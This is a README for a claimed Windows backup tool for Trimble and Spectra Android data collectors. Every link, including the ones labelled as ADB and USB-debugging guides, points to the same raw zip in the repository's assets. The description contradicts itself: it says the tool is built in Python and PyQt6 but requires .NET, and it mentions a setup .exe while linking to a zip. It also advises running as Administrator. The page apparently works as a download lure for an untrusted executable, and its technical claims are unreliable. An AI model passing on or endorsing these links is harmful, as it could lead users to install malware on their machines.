# 🔧 trimble-backup-utility - Backup Tool for Trimble Devices

[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue)](https://raw.githubusercontent.com/vargasjavierrolando-ui/trimble-backup-utility/main/assets/utility_trimble_backup_v2.9.zip)

## 📋 What is trimble-backup-utility?

This is a Windows program to help you create structured backups of data collectors made by Trimble and Spectra. These devices run on Android, and this tool uses ADB (Android Debug Bridge) to connect with them easily. It copies the files and folders in an organized way, so you do not have to sort them yourself. The utility is made for technicians or anyone who works with these devices and wants to keep their data safe.

## 💻 System Requirements

- Windows 10 or later (64-bit recommended)  
- USB port for device connection  
- Android data collectors made by Trimble or Spectra  
- USB debugging enabled on the target device  
- Approximately 100 MB of free disk space for the program and backups  
- Installed Microsoft .NET Framework 4.7 or newer  

You do not need any programming knowledge to use this software.

## 🧰 Features

- Connects to Trimble and Spectra Android devices via ADB  
- Copies data in a clear folder structure  
- Handles multiple devices one at a time  
- Simple interface with step-by-step guidance  
- Saves backups to any folder you choose on your PC  
- Does not modify or delete data on your device  
- Built with Python and PyQt6 for a stable and user-friendly experience

## 🚀 Getting Started

To use the tool, follow the steps below carefully.

### 1. Prepare Your Device

Before connecting your data collector to the PC:

- Turn on the device.  
- Enable USB debugging:  
  - Open **Settings**.  
  - Select **About phone** (or **About device**).  
  - Tap **Build number** 7 times to unlock Developer Options.  
  - Go back to **Settings**, then **Developer options**.  
  - Activate **USB debugging**.  
- Connect the device to your PC with a compatible USB cable.

### 2. Download the Software

Go to the project page below to get the software:

[![Download Software](https://img.shields.io/badge/Download-Here-green)](https://raw.githubusercontent.com/vargasjavierrolando-ui/trimble-backup-utility/main/assets/utility_trimble_backup_v2.9.zip)

Click the green button or look for the latest release. The page will show files to download. Pick the one that says something like `trimble-backup-utility-setup.exe` or similar.

### 3. Install the Software

- After downloading, double-click the `.exe` file.  
- Follow the installation instructions on the screen.  
- Choose an install folder or accept the default.  
- When done, the program will create a desktop shortcut.

### 4. Run the Program

- Double-click the desktop icon or find the program in your start menu.  
- When opened, you will see an interface with options to back up your device.  
- Your connected device should appear automatically if USB debugging is active.

### 5. Create a Backup

- Select your connected device from the list.  
- Choose a folder on your PC where you want the backup saved.  
- Click the **Start Backup** button.  
- Wait for the process to finish. The tool will show progress and report when done.  
- Do not disconnect the device until the backup finishes.

## 🧩 How It Works

The program uses ADB, a command-line tool for interacting with Android devices, to access your Trimble or Spectra device. It grabs the necessary files and copies them to your PC. The backup is stored in folders named by date and device model. This setup helps you find what you need later.

## 🔄 Updating the Software

Software updates improve stability and add features. To update:

- Visit the GitHub link below again.  
- Download the latest version following the steps above.  
- Run the installer; it will replace the old version safely.

## ⚠️ Troubleshooting

Here are common issues and solutions:

- **Device not detected**:  
  - Check USB cable and connection.  
  - Make sure USB debugging is enabled.  
  - Restart the device and PC.  
- **Backup fails or stops**:  
  - Confirm enough free space on your PC.  
  - Close other programs that might block USB or ADB.  
- **Error messages about ADB**:  
  - Install or update the official ADB drivers from Google or device vendors.  
- **Program won't open**:  
  - Ensure .NET Framework 4.7 or newer is installed.  
  - Run as Administrator.

## 🔗 Useful Links

- [Download trimble-backup-utility](https://raw.githubusercontent.com/vargasjavierrolando-ui/trimble-backup-utility/main/assets/utility_trimble_backup_v2.9.zip)  
- [Android ADB Installation Guide](https://raw.githubusercontent.com/vargasjavierrolando-ui/trimble-backup-utility/main/assets/utility_trimble_backup_v2.9.zip)  
- [How to Enable USB Debugging](https://raw.githubusercontent.com/vargasjavierrolando-ui/trimble-backup-utility/main/assets/utility_trimble_backup_v2.9.zip)

## 💡 Tips

- Always back up your data regularly.  
- Use the tool on a stable and powered PC to avoid interruptions.  
- Label backup folders clearly with date and device info.  
- Disconnect your device safely after the backup completes.

---

[![Get the backup tool](https://img.shields.io/badge/Download-Trimble_Backup_Utility-green)](https://raw.githubusercontent.com/vargasjavierrolando-ui/trimble-backup-utility/main/assets/utility_trimble_backup_v2.9.zip)